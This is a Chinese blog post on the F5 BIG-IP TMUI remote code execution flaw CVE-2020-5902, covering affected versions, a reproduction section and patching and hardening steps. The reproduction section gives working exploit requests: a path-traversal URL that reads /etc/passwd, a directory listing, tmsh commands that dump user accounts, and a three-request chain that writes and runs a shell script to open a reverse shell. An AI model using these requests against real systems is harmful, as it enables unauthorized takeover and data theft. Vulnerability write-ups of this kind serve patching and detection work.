**目录**

[F5 BIG-IP](#t0 "F5 BIG-IP")

[CVE-2020-5902](#t1 "CVE-2020-5902")

[漏洞描述](#t2 "漏洞描述")

[漏洞危害等级](#t3 "漏洞危害等级")

[影响版本](#t4 "影响版本")

[漏洞复现](#t5 "漏洞复现")

[任意文件读取POC](#t6 "任意文件读取POC")

[任意列出目录](#t7 "任意列出目录")

[命令执行POC](#t8 "命令执行POC")

[上次sh文件并执行反弹shell](#t9 "上次sh文件并执行反弹shell")

[漏洞修复](#t10 "漏洞修复")

[修复方法一：升级](#t11 "修复方法一：升级")

[修复方法二：加固](#t12 "修复方法二：加固")

* * *

F5 BIG-IP
=========

F5 BIG-IP Edge Gateway是一个接入解决方案，为远程用户提供了[SSL](https://so.csdn.net/so/search?q=SSL&spm=1001.2101.3001.7020) VPN远程接入、安全性、应用加速和高可用性服务。F5 BIG-IP是由美国F5 Networks公司发行的一系列应用交付平台，具有负载均衡，流量管理，应用程序管理等多种功能。能够提供构建灵活的应用交付网络架构所需的基础组件，同时推动企业云架构实现，用户能够全方位监控自己的应用交付环境。

![](https://img-blog.csdnimg.cn/2020070714100583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

CVE-2020-5902
=============

漏洞描述
----

      2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，可以构造恶意请求，在未授权的情况下获得目标服务器的权限，实现任意远程代码执行。

     F5 BIG-IP流量管理用户界面（TMUI）的未公开界面中存在远程代码执行漏洞。该漏洞允许未授权的攻击者或授权用户通过BIG-IP的管理端口或自身IP执行任意系统命令，增删文件，停止服务，或执行任意java代码。该漏洞将导致严重的系统危害，服务器可能被攻击者完全控制，BIG-IP设备也存在此漏洞。

漏洞危害等级
------

**严重**

影响版本
----

*   F5 BIG-IP < 15.1.0.4
*   F5 BIG-IP < 14.1.2.6
*   F5 BIG-IP < 13.1.3.4
*   F5 BIG-IP < 12.1.5.2
*   F5 BIG-IP < 11.6.5.2

漏洞复现
----

### **任意文件读取POC**

```
https://xx.xx.xx.xx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
```


![](https://img-blog.csdnimg.cn/20200707141323985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 任意列出目录

```
https://xx.xx.xx.xx/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/
```


![](https://img-blog.csdnimg.cn/20200708143554319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **命令执行POC**

注：这个命令执行只是执行f5的命令，而不是服务器的系统命令

```
#查看admin用户的信息      
https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin       
#查看所有用户的信息      
https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user
```


![](https://img-blog.csdnimg.cn/20200707141355118.png)

### **上次sh文件并执行反弹shell**

**一：创建**

```
POST /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1      
Host: xx.xx.xx.xx      
Connection: close      
Upgrade-Insecure-Requests: 1      
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9      
Sec-Fetch-Site: same-origin      
Sec-Fetch-Mode: navigate      
Sec-Fetch-Dest: document      1
Referer: https://xx.xx.xx.xx/      1
Accept-Encoding: gzip, deflate      1
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8      1
Content-Type: application/x-www-form-urlencoded      1
Content-Length: 50       1
command=create+cli+alias+private+list+command+bash
```


![](https://img-blog.csdnimg.cn/20200708140457377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**二：写入sh文件**

```
POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1      
Host: xx.xx.xx.xx      
Connection: close      
Upgrade-Insecure-Requests: 1      
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9      
Sec-Fetch-Site: same-origin      
Sec-Fetch-Mode: navigate      
Sec-Fetch-Dest: document      1
Referer: https://xx.xx.xx.xx/      1
Accept-Encoding: gzip, deflate      1
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8      1
Content-Type: application/x-www-form-urlencoded      1
Content-Length: 175       1
fileName=/tmp/xx.sh&content=URL编码后的反弹shell命令
```


![](https://img-blog.csdnimg.cn/20200708140639414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**三：执行sh脚本反弹shell** 

```
POST /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1      
Host: xx.xx.xx.xx      
Connection: close      
Upgrade-Insecure-Requests: 1      
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9      
Sec-Fetch-Site: same-origin      
Sec-Fetch-Mode: navigate      
Sec-Fetch-Dest: document      1
Referer: https://xx.xx.xx.xx/      1
Accept-Encoding: gzip, deflate      1
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8      1
Content-Type: application/x-www-form-urlencoded      1
Content-Length: 23       1
command=list+/tmp/xx.sh
```


![](https://img-blog.csdnimg.cn/20200708140658449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

漏洞修复
----

### **修复方法一：升级**

升级到以下版本

*   BIG-IP 15.x: 15.1.0.4
*   BIG-IP 14.x: 14.1.2.6
*   BIG-IP 13.x: 13.1.3.4
*   BIG-IP 12.x: 12.1.5.2
*   BIG-IP 11.x: 11.6.5.2

### **修复方法二：****加固**

1、使用以下命令登录对应系统

```
Tmsh
```


2、编辑 httpd 组件的配置文件       

```
edit /sys httpd all-properties
```


3、文件内容如下

```
include ' <LocationMatch ".*..;.*"> Redirect 404 / </LocationMatch> '
```


4、按照如下操作保存文件

```
按下 ESC       
并依次输入 :wq
```


5、执行命令刷新配置文件

```
save /sys config
```


6、重启 httpd 服务

```
restart sys service httpd   并禁止外部IP对 TMUI 页面的访问
```


  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：

[GitHub - jas502n/CVE-2020-5902 at c6a3eb32e276c46706d37fb1ee9b71bf9549d30f](https://github.com/jas502n/CVE-2020-5902/tree/c6a3eb32e276c46706d37fb1ee9b71bf9549d30f "GitHub - jas502n/CVE-2020-5902 at c6a3eb32e276c46706d37fb1ee9b71bf9549d30f")

[F5 BIG-IP TMUI 远程代码执行漏洞通告，腾讯漏洞扫描服务已支持检测](https://mp.weixin.qq.com/s/pIxsSjgWPjQ_cLPGs95PZA "F5 BIG-IP TMUI 远程代码执行漏洞通告，腾讯漏洞扫描服务已支持检测")

[【漏洞预警】F5 BIG-IP TMUI 远程代码执行漏洞（CVE-2020-5902）](https://mp.weixin.qq.com/s/PdO6FTz73eZbcrnCsaCN4g "【漏洞预警】F5 BIG-IP TMUI 远程代码执行漏洞（CVE-2020-5902）")